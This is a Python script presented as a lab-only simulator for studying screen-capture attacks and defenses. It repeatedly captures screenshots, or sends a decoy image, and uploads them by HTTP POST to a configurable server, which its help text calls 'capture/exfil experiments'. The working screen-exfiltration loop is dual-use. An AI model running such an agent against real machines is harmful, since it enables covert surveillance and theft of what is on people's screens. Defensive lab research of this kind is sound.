#!/usr/bin/env python3
"""
Lab-only monitor agent (attack-side simulator you control).

This is NOT malware. It is a minimal screen-capture uploader for isolated research:
  - live mode: real screenshots (baseline monitor behavior)
  - decoy mode: upload a preset PNG instead of the real screen (application-layer fake feed)
  - display mode: capture one monitor index only

Why this exists
---------------
Third-party malware cannot be reliably fed fake OS-level screenshots. For research, you
build BOTH sides in a lab:

  Target VM  -> monitor_agent.py  --upload-->  monitor_server.py  (operator VM)

Then test defenses:
  1) network block to server
  2) revoke Screen Recording permission
  3) decoy desktop vs live desktop
  4) decoy mode on the agent (simulates a compromised agent sending fake bytes)

Requires Screen Recording permission on the target machine.
Use only in VMs / isolated lab networks you own.
"""

from __future__ import annotations

import argparse
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

try:
    import mss
    import mss.tools
except ImportError as exc:
    print("Install lab deps: pip install -r lab/requirements-lab.txt", file=sys.stderr)
    raise SystemExit(1) from exc


def capture_live(display_index: int) -> bytes:
    with mss.mss() as grabber:
        monitors = grabber.monitors
        if display_index >= len(monitors):
            raise ValueError(
                f"Display index {display_index} unavailable. "
                f"Detected {max(len(monitors) - 1, 0)} capture target(s)."
            )
        shot = grabber.grab(monitors[display_index])
        return mss.tools.to_png(shot.rgb, shot.size)


def capture_decoy(decoy_image: Path) -> bytes:
    if not decoy_image.is_file():
        raise FileNotFoundError(f"Decoy image not found: {decoy_image}")
    return decoy_image.read_bytes()


def upload(
    server_url: str,
    png_bytes: bytes,
    *,
    agent_name: str,
    capture_mode: str,
    timeout: float,
) -> None:
    request = urllib.request.Request(
        server_url.rstrip("/") + "/upload",
        data=png_bytes,
        method="POST",
        headers={
            "Content-Type": "image/png",
            "X-Agent-Name": agent_name,
            "X-Capture-Mode": capture_mode,
        },
    )
    with urllib.request.urlopen(request, timeout=timeout) as response:
        response.read()


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Lab monitor agent for capture/exfil experiments.")
    parser.add_argument(
        "--server",
        default="http://127.0.0.1:8765",
        help="Lab monitor_server base URL (default: http://127.0.0.1:8765)",
    )
    parser.add_argument(
        "--mode",
        choices=("live", "decoy"),
        default="live",
        help="live=real screen, decoy=preset PNG only (default: live)",
    )
    parser.add_argument(
        "--decoy-image",
        type=Path,
        default=Path(__file__).resolve().parent / "samples" / "decoy_home.png",
        help="PNG used when --mode decoy",
    )
    parser.add_argument(
        "--display",
        type=int,
        default=1,
        help="Monitor index for live capture (1=primary, default: 1)",
    )
    parser.add_argument("--interval", type=float, default=10.0, help="Seconds between uploads")
    parser.add_argument("--count", type=int, default=0, help="Upload N times then stop (0=forever)")
    parser.add_argument("--agent-name", default="lab-agent-1", help="Label sent to the server")
    parser.add_argument("--timeout", type=float, default=10.0, help="HTTP timeout seconds")
    return parser.parse_args()


def main() -> None:
    args = parse_args()
    uploads = 0

    print(
        f"Lab monitor agent starting mode={args.mode} server={args.server}\n"
        "Press Ctrl+C to stop.",
        flush=True,
    )

    while True:
        try:
            if args.mode == "decoy":
                png = capture_decoy(args.decoy_image)
            else:
                png = capture_live(args.display)
            upload(
                args.server,
                png,
                agent_name=args.agent_name,
                capture_mode=args.mode,
                timeout=args.timeout,
            )
            uploads += 1
            print(f"[uploaded] #{uploads} bytes={len(png)} mode={args.mode}", flush=True)
        except urllib.error.URLError as exc:
            print(f"[network-error] {exc}", flush=True)
        except Exception as exc:  # noqa: BLE001 - lab tool, surface all capture errors
            print(f"[error] {exc}", flush=True)

        if args.count and uploads >= args.count:
            break
        time.sleep(args.interval)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped.", flush=True)
